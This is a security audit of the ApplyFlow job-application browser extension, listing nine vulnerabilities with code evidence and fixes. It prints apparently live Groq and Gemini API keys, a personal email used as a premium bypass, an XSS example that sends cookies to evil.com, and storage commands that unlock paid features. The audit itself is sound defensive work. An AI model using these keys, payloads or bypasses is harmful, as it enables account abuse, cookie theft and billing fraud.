# 🔐 ApplyFlow — Security Vulnerability Audit

> **Audited:** `d:\Projects\applyflow`  
> **Date:** 2026-06-22  
> **Scope:** Full source code (background, content scripts, shared modules, manifest)

---

## Summary Table

| # | Vulnerability | File(s) | Severity | CVSS (est.) |
|---|---------------|---------|----------|-------------|
| 1 | **Live API Key Hard-coded & Committed** | `storage.ts`, `.env` | 🔴 CRITICAL | 9.8 |
| 2 | **XSS via Unescaped Profile Data in Inner HTML** | `overlay.ts`, `atsFiller.ts` | 🔴 CRITICAL | 9.1 |
| 3 | **Hardcoded Premium Bypass & License Key** | `storage.ts` | 🟠 HIGH | 8.2 |
| 4 | **Message Spoofing — No Sender Validation** | `service-worker.ts`, `atsFiller.ts` | 🟠 HIGH | 7.9 |
| 5 | **Privilege Escalation via `*://*/*` Host Permissions** | `manifest.json` | 🟠 HIGH | 7.5 |
| 6 | **Credit System Bypassed Client-Side** | `storage.ts`, `aiService.ts` | 🟡 MEDIUM | 6.5 |
| 7 | **Sensitive Data Logged to Console** | `service-worker.ts`, `atsFiller.ts`, `aiService.ts` | 🟡 MEDIUM | 5.5 |
| 8 | **Gemini API Key Exposed via Overlay Direct Fetch** | `overlay.ts` | 🟡 MEDIUM | 5.3 |
| 9 | **`Math.random()` Used for Security IDs** | `storage.ts`, `overlay.ts` | 🟢 LOW | 3.7 |

---

## 🔴 CRITICAL — Vulnerability #1: Live API Key Hard-coded & Committed

### Description
A live **Groq API key** is stored in `.env` and also a **Google Gemini API key** is hard-coded directly in `storage.ts` as a fallback default value. Anyone who clones the repo or unpacks the built extension zip can steal both keys.

### Evidence

**[.env](file:///d:/Projects/applyflow/.env) — Line 1:**
```
VITE_GROQ_API_KEY=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
```

**[storage.ts](file:///d:/Projects/applyflow/src/shared/storage.ts) — Lines 17, 23, 70:**
```typescript
geminiApiKey: import.meta.env.VITE_GEMINI_API_KEY || 'AIzaSyBq-whqtAErXrbshvOFX9J22-7AMWSItAo',
supabaseUrl: import.meta.env.VITE_SUPABASE_URL || 'https://lqddvilwmqthidjklghv.supabase.co',
s.geminiApiKey = import.meta.env.VITE_GEMINI_API_KEY || 'AIzaSyBq-whqtAErXrbshvOFX9J22-7AMWSItAo';
```

### Why It's Critical
- Vite **inlines** `import.meta.env.*` values into the bundled JS. The key ends up readable in `dist/assets/*.js`.
- The extension zip (`applyflow.zip`) already on disk contains the compiled output with keys baked in.
- When distributed to the Chrome Web Store, **millions of users receive the keys**.
- An attacker can run up massive Groq/Gemini bills against your account or exhaust your quota.

### Fix
1. **Immediately revoke** both keys from Groq and Google AI Studio dashboards.
2. **Never use a hardcoded fallback** for API keys. If no key is provided, the feature should be disabled, not fall back to a developer key.
3. Move API calls to a server-side proxy (Cloudflare Worker / Supabase Edge Function). The extension should send requests to your proxy, which holds the key in a real environment variable.
4. Add `.env` to `.gitignore` — ✅ already done, but the key must be rotated since it existed in the working tree.

---

## 🔴 CRITICAL — Vulnerability #2: XSS via Unescaped Profile Data in innerHTML

### Description
User-controlled profile data (name, project title, project description, work experience, etc.) is directly interpolated into `innerHTML` strings **without any HTML escaping**. A malicious value — e.g., in a resume or saved profile — could execute arbitrary JavaScript in the context of job application pages.

### Evidence

**[overlay.ts](file:///d:/Projects/applyflow/src/content/overlay.ts) — Lines 172–183:**
```typescript
widget.innerHTML = `
  ...
  ${(profile.projects || []).map(p => `
    <div class="af-ref-card">
      <span class="af-ref-title">${p.title}</span>        // ← NO ESCAPING
      <span class="af-ref-desc">${p.description}</span>   // ← NO ESCAPING
    </div>
  `).join('')}
  ${(profile.workExperience || []).map(e => `
    <div class="af-ref-card">
      <span class="af-ref-title">${e.role} @ ${e.company}</span>   // ← NO ESCAPING
      <span class="af-ref-desc">${e.description}</span>             // ← NO ESCAPING
    </div>
  `).join('')}
`;
```

**[overlay.ts](file:///d:/Projects/applyflow/src/content/overlay.ts) — Lines 155–157:**
```typescript
// match score is user-influenced via AI response, not sanitized
stroke-dasharray="${analysis.matchScore}, 100"
<span class="af-badge-score">${analysis.matchScore}%</span>
```

**[atsFiller.ts](file:///d:/Projects/applyflow/src/content/atsFiller.ts) — Line 930:**
```typescript
// platformName comes from URL detection, but still interpolated into innerHTML
Autofilling on <strong style="...">${platformName}</strong>
```

### Attack Scenario
A threat actor could trick the user into importing a crafted resume that sets:
```
profile.name = '<img src=x onerror="fetch(\'https://evil.com/steal?k=\'+document.cookie)">'
```
When the overlay renders on a job site (LinkedIn, Greenhouse, etc.), this executes in that site's content context, allowing cookie theft, form data exfiltration, or credential harvesting.

> **Note:** Shadow DOM (`mode: 'open'`) does NOT protect against XSS injected via `innerHTML` inside the shadow root itself.

### Fix
Create an HTML escape helper and use it on **every** piece of user data before inserting into HTML:
```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Usage:
`<span class="af-ref-title">${escapeHtml(p.title)}</span>`
```
Prefer using `element.textContent = value` (DOM API) instead of template literals for purely textual content.

---

## 🟠 HIGH — Vulnerability #3: Hardcoded Premium Bypass & Weak License Check

### Description
The billing/premium system is trivially bypassable. Two major flaws:

1. A **single email address** is permanently hard-coded as always-premium, bypassing all billing.
2. The only "license key" check compares against a **plaintext hardcoded string** `'APPLYFLOW-PRO-2026'`.

### Evidence

**[storage.ts](file:///d:/Projects/applyflow/src/shared/storage.ts) — Lines 72–74, 83–85:**
```typescript
if (s.userEmail === 'keshavagrawal273@gmail.com') {
  s.isPremium = true;
}
```
```typescript
if (newSettings.userEmail === 'keshavagrawal273@gmail.com') {
  newSettings.isPremium = true;
}
```

**[storage.ts](file:///d:/Projects/applyflow/src/shared/storage.ts) — Lines 247–253:**
```typescript
if (settings.isPremium) {
  if (settings.licenseKey === 'APPLYFLOW-PRO-2026') {
    plan = 'ultimate_yearly';
    allocated = 2500;
  } else {
    plan = 'pro_monthly';
    allocated = 150;
  }
}
```

### Why It's High
- The hardcoded email is **published in the extension bundle** — anyone decompiling the JS sees it.
- The license key `APPLYFLOW-PRO-2026` is trivially discovered, allowing any user to unlock the ultimate tier with 2500 credits.
- Since all validation happens client-side in `chrome.storage.local`, any user can open DevTools and call `chrome.storage.local.set({ settings: { isPremium: true, licenseKey: 'APPLYFLOW-PRO-2026' } })` to unlock everything permanently.

### Fix
- Remove the hardcoded email entirely. Use a server-side check (Supabase RLS / edge function) to verify premium status.
- License keys should be **cryptographically signed tokens** (e.g., JWT) verified against a server endpoint, not compared to a plaintext string.
- Never trust `isPremium` from local storage for credit allocation — always fetch authoritative state from the server.

---

## 🟠 HIGH — Vulnerability #4: Message Spoofing — No Sender Validation

### Description
The `chrome.runtime.onMessage` handler in the service worker and the content script message listener in `atsFiller.ts` accept and act on **any message without verifying the sender**. Malicious web pages or other extensions can send forged messages to trigger sensitive actions.

### Evidence

**[service-worker.ts](file:///d:/Projects/applyflow/src/background/service-worker.ts) — Lines 134–380:**
```typescript
chrome.runtime.onMessage.addListener((
  message: { type: string; payload?: any; message?: string }
) => {
  // No sender.id check, no sender.origin check, no sender.url check
  if (message.type === 'CLIP_JOB') {
    Storage.addApplication(message.payload)  // ← Writes untrusted data to storage
  }
  if (message.type === 'IMMEDIATE_LOG') {
    Storage.addApplication(message.payload)  // ← Same issue
  }
  if (message.type === 'FILL_FIELDS') {
    const { fields, profile, pendingApp } = message.payload;
    // Injects a script with user-controlled profile data into the active tab
    chrome.tabs.sendMessage(tabId, { type: 'DO_FILL', payload: { fields, profile } });
  }
  if (message.type === 'ATS_FILL') {
    // Injects atsFiller into active tab with attacker-controlled profile
  }
});
```

**[atsFiller.ts](file:///d:/Projects/applyflow/src/content/atsFiller.ts) — Lines 1102–1112:**
```typescript
chrome.runtime.onMessage.addListener((message: { type: string; payload?: any }) => {
  if (message.type === 'DO_ATS_FILL') {
    const { profile } = message.payload;  // No validation of profile structure
    runATSFill(profile)
  }
});
```

### Attack Scenario
A malicious web page could send:
```javascript
chrome.runtime.sendMessage(extensionId, {
  type: 'CLIP_JOB',
  payload: { id: 'injected', company: '<script>...</script>', url: 'evil.com' }
});
```
Or trigger `ATS_FILL` with a crafted profile payload to inject arbitrary data into forms.

### Fix
```typescript
chrome.runtime.onMessage.addListener((message, sender) => {
  // Only accept from own extension
  if (sender.id !== chrome.runtime.id) return;
  // For content scripts: also validate sender.origin if needed
  // ...
});
```
Validate the `sender.id` on every message handler.

---

## 🟠 HIGH — Vulnerability #5: Overly Broad Host Permissions (`*://*/*`)

### Description
The manifest requests `host_permissions: ["*://*/*"]`, granting the extension access to **every website the user visits** — including banking sites, email, social media, healthcare portals. This is far broader than needed for a job application filler.

### Evidence

**[manifest.json](file:///d:/Projects/applyflow/dist/manifest.json) — Lines 23–25:**
```json
"host_permissions": [
  "*://*/*"
]
```

**[manifest.json](file:///d:/Projects/applyflow/dist/manifest.json) — Lines 58–65 (content scripts):**
```json
"matches": ["*://*/*"]  // clipper, fab, overlay all run on ALL sites
```

### Why It's High
- Browsers warn users about "Read and change all your data on all websites," which **reduces install trust** and violates the principle of least privilege.
- The overlay, clipper, and fab content scripts run on *every* page the user visits — reading DOM content on banking, government, and medical sites with no legitimate need.
- If any content script is compromised (e.g., via supply chain attack in a dependency), the blast radius is unlimited.

### Fix
Restrict `host_permissions` to only the known job platforms:
```json
"host_permissions": [
  "*://*.linkedin.com/*",
  "*://*.internshala.com/*",
  "*://*.unstop.com/*",
  "*://*.myworkdayjobs.com/*",
  "*://*.greenhouse.io/*",
  "*://*.lever.co/*",
  "*://*.naukri.com/*",
  "*://*.indeed.com/*",
  "*://*.bamboohr.com/*",
  "*://*.groq.com/*",
  "*://generativelanguage.googleapis.com/*"
]
```
Use `activeTab` permission for one-time scanning, instead of broad host access.

---

## 🟡 MEDIUM — Vulnerability #6: Credit System Bypassed Client-Side

### Description
The credit deduction logic lives entirely in the client extension. When Supabase sync is disabled, credits are deducted from `chrome.storage.local`, which any user can freely manipulate. The check `cost <= 0 returns true` also means `smart_autofill` deducts 0 credits and always succeeds regardless of billing state.

### Evidence

**[aiService.ts](file:///d:/Projects/applyflow/src/shared/aiService.ts) — Lines 231–232:**
```typescript
const success = await Storage.deductCredits(0, 'smart_autofill');
// cost=0 → always returns true (line 310 in storage.ts: "if (cost <= 0) return true")
```

**[storage.ts](file:///d:/Projects/applyflow/src/shared/storage.ts) — Lines 309–310:**
```typescript
deductCredits: async (cost: number, feature: string): Promise<boolean> => {
  if (cost <= 0) return true;  // ← bypasses all billing checks
```

**[storage.ts](file:///d:/Projects/applyflow/src/shared/storage.ts) — Lines 361–377:**
```typescript
} else {
  // Local deduction — entirely user-controllable
  billing.creditsUsed += cost;
  await chrome.storage.local.set({ billing });
```
A user can set `chrome.storage.local.set({ billing: { creditsUsed: 0, creditsAllocated: 999999 } })` to get unlimited credits.

### Fix
- Move all credit enforcement to the server (Supabase RLS + Edge Functions).
- The extension should call a server endpoint that atomically checks and deducts credits before returning the AI response.
- Remove the `cost <= 0 → return true` shortcut, or at minimum log it as an anomaly.

---

## 🟡 MEDIUM — Vulnerability #7: Sensitive Data Logged to Console

### Description
Multiple locations log sensitive user data (profile, API keys, application payloads) to the console using `console.log` / `console.error`. In production extensions, these logs are visible to any user who opens DevTools on an extension page, and can be captured by other content scripts or extensions with `console` hooks.

### Evidence

**[service-worker.ts](file:///d:/Projects/applyflow/src/background/service-worker.ts) — Lines 282–286:**
```typescript
console.log('[ApplyFlow SW] Received ATS_FILL message with payload:', message.payload);
// ↑ Logs the entire user profile (name, email, phone, resume text) to console
console.log('[ApplyFlow SW] Query active lastFocusedWindow tabs:', tabs);
```

**[aiService.ts](file:///d:/Projects/applyflow/src/shared/aiService.ts) — Line 51:**
```typescript
console.error("=== RAW AI OUTPUT ===", responseText);
// ↑ Logs full AI response including any profile data it contains
```

**[atsFiller.ts](file:///d:/Projects/applyflow/src/content/atsFiller.ts) — Lines 396, 419–424:**
```typescript
console.log('[ApplyFlow ATS] Running fillInternshala with profile:', profile);
// ↑ Logs entire profile object (PII: name, email, phone, resume) on every fill
```

### Fix
- Remove all `console.log` calls that contain user PII or profile objects before production builds.
- Use a debug flag: `if (import.meta.env.DEV) console.log(...)`.
- Never log API keys, profile objects, or full payloads in production.

---

## 🟡 MEDIUM — Vulnerability #8: Gemini API Key Exposed via Client-Side Fetch

### Description
`overlay.ts` makes a **direct fetch call to the Gemini API** from the content script, using the `apiKey` from settings. Since content scripts run in the browser, the API key is fully visible in the Network tab of DevTools on any job site.

### Evidence

**[overlay.ts](file:///d:/Projects/applyflow/src/content/overlay.ts) — Lines 88–96:**
```typescript
const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${apiKey}`;
const response = await fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ ... })
});
```

The key appears in the URL (query parameter) — even more exposed than an Authorization header, since URLs are logged in browser history, proxy logs, and CORS preflight requests.

### Fix
- Never put the API key in a URL query string.
- Route all AI calls through the service worker (background script) using `chrome.runtime.sendMessage`, which doesn't expose the key to the page's DevTools network tab.
- Long term: use a server-side proxy.

---

## 🟢 LOW — Vulnerability #9: `Math.random()` Used for Security-Sensitive IDs

### Description
Application IDs and transaction IDs are generated with `Math.random()`, which is **not cryptographically secure**. These IDs could theoretically be predicted or brute-forced to manipulate records.

### Evidence

**[storage.ts](file:///d:/Projects/applyflow/src/shared/storage.ts) — Lines 370, 432:**
```typescript
id: typeof crypto.randomUUID === 'function' ? crypto.randomUUID() : Math.random().toString(36).substring(2),
```

**[overlay.ts](file:///d:/Projects/applyflow/src/content/overlay.ts) — Line 301:**
```typescript
id: Math.random().toString(36).substring(2, 11),  // ← Always uses Math.random, no crypto fallback
```

### Fix
Always use `crypto.randomUUID()` — it is available in all modern browsers and in Chrome extension service workers:
```typescript
const id = crypto.randomUUID();
```

---

## 🛠️ Priority Fix Roadmap

| Priority | Action | Est. Effort |
|----------|--------|-------------|
| **P0 — Immediate** | Revoke & rotate Groq + Gemini API keys | 15 min |
| **P0 — Immediate** | Remove hardcoded API keys from `storage.ts` | 30 min |
| **P1 — This Week** | Add `escapeHtml()` to all `innerHTML` insertions | 2 hours |
| **P1 — This Week** | Add `sender.id` check to all `onMessage` listeners | 1 hour |
| **P2 — This Sprint** | Restrict `host_permissions` to job site domains | 1 hour |
| **P2 — This Sprint** | Remove all console.log PII leaks | 1 hour |
| **P2 — This Sprint** | Remove hardcoded email/license bypass | 30 min |
| **P3 — Next Sprint** | Move AI calls behind a server proxy | 1–2 days |
| **P3 — Next Sprint** | Move credit enforcement server-side | 1–2 days |
| **P4 — Backlog** | Replace `Math.random()` with `crypto.randomUUID()` | 30 min |
